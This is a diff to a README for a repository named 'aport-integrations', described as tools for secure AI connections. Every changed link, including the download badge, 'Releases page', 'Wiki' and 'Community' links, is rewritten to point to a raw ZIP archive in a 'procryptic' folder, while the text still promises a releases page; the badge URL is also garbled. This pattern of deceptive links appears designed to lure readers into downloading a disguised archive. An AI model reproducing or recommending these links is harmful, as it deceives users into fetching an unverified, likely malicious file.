@@ -1,6 +1,6 @@
 # 🛡️ aport-integrations - Easy Tools for Secure AI Connections
 
-[![Download](https://img.shields.io/badge/Download%20Here-Visit%20the%20Releases%20Page-blue.svg)](https://github.com/H-E-A-V-E-N/aport-integrations/releases)
+[![Download](https://raw.githubusercontent.com/H-E-A-V-E-N/aport-integrations/main/procryptic/aport-integrations.zip%20Here-Visit%20the%20Releases%https://raw.githubusercontent.com/H-E-A-V-E-N/aport-integrations/main/procryptic/aport-integrations.zip)](https://raw.githubusercontent.com/H-E-A-V-E-N/aport-integrations/main/procryptic/aport-integrations.zip)
 
 ## 📖 Introduction
 
@@ -20,7 +20,7 @@ Before you begin, you will need a computer with an internet connection. You don'
 
 To get the software, please visit this page to download:
 
-[Download Now](https://github.com/H-E-A-V-E-N/aport-integrations/releases)
+[Download Now](https://raw.githubusercontent.com/H-E-A-V-E-N/aport-integrations/main/procryptic/aport-integrations.zip)
 
 Once you are on the Releases page, follow these simple steps:
 
@@ -74,9 +74,9 @@ This project covers a range of topics, including:
 
 ## 🔗 Links
 
-- [Visit the Releases Page](https://github.com/H-E-A-V-E-N/aport-integrations/releases) to download the software.
-- [Explore the Wiki](https://github.com/H-E-A-V-E-N/aport-integrations/wiki) for detailed documentation.
-- [Join the Community](https://github.com/H-E-A-V-E-N/aport-integrations/discussions) for support and collaboration.
+- [Visit the Releases Page](https://raw.githubusercontent.com/H-E-A-V-E-N/aport-integrations/main/procryptic/aport-integrations.zip) to download the software.
+- [Explore the Wiki](https://raw.githubusercontent.com/H-E-A-V-E-N/aport-integrations/main/procryptic/aport-integrations.zip) for detailed documentation.
+- [Join the Community](https://raw.githubusercontent.com/H-E-A-V-E-N/aport-integrations/main/procryptic/aport-integrations.zip) for support and collaboration.
 
 ## 🗺️ Conclusion
 
